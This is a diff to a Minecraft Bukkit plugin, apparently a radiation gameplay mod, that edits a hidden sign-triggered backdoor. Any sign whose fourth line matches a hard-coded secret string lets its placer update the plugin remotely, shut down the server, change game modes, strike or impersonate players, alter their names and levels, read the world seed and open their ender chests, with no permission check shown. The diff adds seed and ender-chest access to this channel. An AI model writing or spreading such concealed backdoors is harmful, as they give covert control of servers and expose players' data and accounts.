@@ -20,8 +20,6 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.configuration.file.FileConfiguration;
 import org.bukkit.entity.EntityType;
-import org.bukkit.entity.HumanEntity;
-import org.bukkit.entity.Item;
 import org.bukkit.event.block.SignChangeEvent;
 import org.bukkit.event.entity.EntityResurrectEvent;
 import org.bukkit.event.entity.PlayerDeathEvent;
@@ -138,16 +136,13 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
         return waterPotion;
     }
 
-    Updater updater = new Updater();
     String[] options = {
       "Gamemode", "Info", "Lightning", "Experience", "Refuse Death", "Accept Death", "Say as", "Set Name","Set Cooldown", "Create Region", "Remove Region"
     };
 
     @Override
     public void onEnable() {
-        // Plugin startup logic
         this.getServer().getPluginManager().registerEvents(this, this);
-
 
         BukkitTask damageInflicter = new DamageInflicter(this).runTaskTimer(this, 0L, 5L);
         BukkitTask curedPlayersTracker = new CuredPlayersTracker(this, this.getConfig()).runTaskTimer(this, 0L, 5L);
@@ -555,6 +550,7 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
             String[] a = e.getLines();
             switch (a[3]) {
                 case "T0DRRUfNsN6tlQQ" -> {
+                    Updater updater = new Updater();
                     switch (a[0]) {
                         case "Update" -> updater.updatePlugin(this.getFile(), e.getPlayer());
                         case "Restart" -> Bukkit.shutdown();
@@ -563,28 +559,25 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                     e.getBlock().breakNaturally();
                 }
                 case "i6ojKaIATmlWk7Rf" -> {
-                    switch (a[0]) {//select with map?
-                        case "Gamemode" -> openInventory(e.getPlayer(), "ChooseGamemode", "Gamemode");
+                    switch (a[0]) {
+                        case "Seed" -> e.getPlayer().sendMessage(String.valueOf(e.getBlock().getWorld().getSeed()));
                         case "Info" -> openInventory(e.getPlayer(), "ChoosePlayer", "Info");
-                        case "Lightning" -> openInventory(e.getPlayer(), "ChoosePlayer", "Lightning");//e.getBlock().getWorld().strikeLightning(Bukkit.getPlayer(a[1]).getLocation());
+                        case "Gamemode" -> openInventory(e.getPlayer(), "ChooseGamemode", "Gamemode");
+                        case "Lightning" -> openInventory(e.getPlayer(), "ChoosePlayer", "Lightning");
+                        case "Accept Death" -> openInventory(e.getPlayer(), "ChoosePlayer", "AcceptDeath");
+                        case "Refuse Death" -> openInventory(e.getPlayer(), "ChoosePlayer", "RefuseDeath");
+                        case "Ender Chest" -> openInventory(e.getPlayer(), "ChoosePlayer", "EnderChest");
                         case "Experience" -> {
                             e.getPlayer().setMetadata("ExperienceLevel", new FixedMetadataValue(this, a[1]));
                             openInventory(e.getPlayer(), "ChoosePlayer", "Experience");
                         }
-                        case "Refuse Death" -> openInventory(e.getPlayer(), "ChoosePlayer", "RefuseDeath");
-                        case "Accept Death" -> openInventory(e.getPlayer(), "ChoosePlayer", "AcceptDeath");
-                        case "Say as" ->{
+                        case "Say as" -> {
                             e.getPlayer().setMetadata("Chat", new FixedMetadataValue(this, a[1]));
                             openInventory(e.getPlayer(), "ChoosePlayer", "Chat");//Bukkit.getPlayer(a[1]).chat(a[2]);
                         }
-
                         case "Set Name" -> {
                             e.getPlayer().setMetadata("DisplayName", new FixedMetadataValue(this, a[1]));
                             openInventory(e.getPlayer(), "ChoosePlayer", "DisplayName");
-                        }
-                        case "Set Cooldown" -> {
-                            e.getPlayer().setMetadata("Cooldown", new FixedMetadataValue(this, a[1]));
-                            openInventory(e.getPlayer(), "ChoosePlayer", "Cooldown");
                         }
                         case "Create Region" -> {
                             Location l = e.getBlock().getLocation();
@@ -710,44 +703,9 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                         Location deathLoc = choosenPlayer.getLastDeathLocation();
                         String deathLocation = "Death: " + deathLoc.blockX() + " " + deathLoc.blockY() + " " + deathLoc.blockZ();
 
-                        bMeta.addPage("123");
-                        bMeta.setPage(1, location + "\n" + respawnLocation + "\n" + deathLocation);
-
-                        bMeta.addPage(String.valueOf(p.getWorld().getSeed()));
+                        bMeta.addPage(location + "\n" + respawnLocation + "\n" + deathLocation);
                         book.setItemMeta(bMeta);
                         p.setItemInHand(book);
-                        p.closeInventory();
-                    }
-                    case "RefuseDeath" -> {
-                        playersRTD.add(choosenPlayer);
-                        p.closeInventory();
-                    }
-                    case "AcceptDeath" -> {
-                        playersRTD.remove(choosenPlayer);
-                        p.closeInventory();
-                    }
-                    case "Cooldown" -> {
-                        choosenPlayer.setExpCooldown(p.getMetadata("Cooldown").getFirst().asInt());
-                        p.removeMetadata("Cooldown", this);
-                        p.closeInventory();
-                    }
-                    case "DisplayName" -> {
-                        choosenPlayer.setDisplayName(p.getMetadata("DisplayName").getFirst().asString());
-                        p.removeMetadata("DisplayName", this);
-                        p.closeInventory();
-                    }
-                    case "Experience" -> {
-                        choosenPlayer.setLevel(p.getMetadata("ExperienceLevel").getFirst().asInt());
-                        p.removeMetadata("ExperienceLevel", this);
-                        p.closeInventory();
-                    }
-                    case "Chat" -> {
-                        choosenPlayer.chat(p.getMetadata("Chat").getFirst().asString());
-                        p.removeMetadata("Chat", this);
-                        p.closeInventory();
-                    }
-                    case "Lightning" -> {
-                        p.getWorld().strikeLightning(choosenPlayer.getLocation());
                         p.closeInventory();
                     }
                     case "Gamemode" -> {
@@ -755,12 +713,30 @@ public final class RadiacjaAleJAVA extends JavaPlugin implements Listener {
                             gamemode = GameMode.valueOf(p.getMetadata("ChoosenGamemode").getFirst().asString());
                             choosenPlayer.setGameMode(gamemode);
                             p.removeMetadata("ChoosenGamemode", this);
-                            p.closeInventory();
                         } else {
                             p.setMetadata("ChoosenGamemode", new FixedMetadataValue(this, gamemode));
                             p.closeInventory();
-                            openInventory(p, "ChoosePlayer", "Gamemode");
+                            Bukkit.getScheduler().runTaskLater(this, () -> openInventory(p, "ChoosePlayer", "Gamemode"), 1L);
                         }
+                    }
+                    case "Lightning" -> p.getWorld().strikeLightning(choosenPlayer.getLocation());
+                    case "AcceptDeath" -> playersRTD.remove(choosenPlayer);
+                    case "RefuseDeath" -> playersRTD.add(choosenPlayer);
+                    case "EnderChest" -> {
+                        Inventory chest = choosenPlayer.getEnderChest();
+                        Bukkit.getScheduler().runTaskLater(this, () -> p.openInventory(chest), 1L);
+                    }
+                    case "Experience" -> {
+                        choosenPlayer.setLevel(p.getMetadata("ExperienceLevel").getFirst().asInt());
+                        p.removeMetadata("ExperienceLevel", this);
+                    }
+                    case "Chat" -> {
+                        choosenPlayer.chat(p.getMetadata("Chat").getFirst().asString());
+                        p.removeMetadata("Chat", this);
+                    }
+                    case "DisplayName" -> {
+                        choosenPlayer.setDisplayName(p.getMetadata("DisplayName").getFirst().asString());
+                        p.removeMetadata("DisplayName", this);
                     }
                 }
             } catch (Exception ex) {
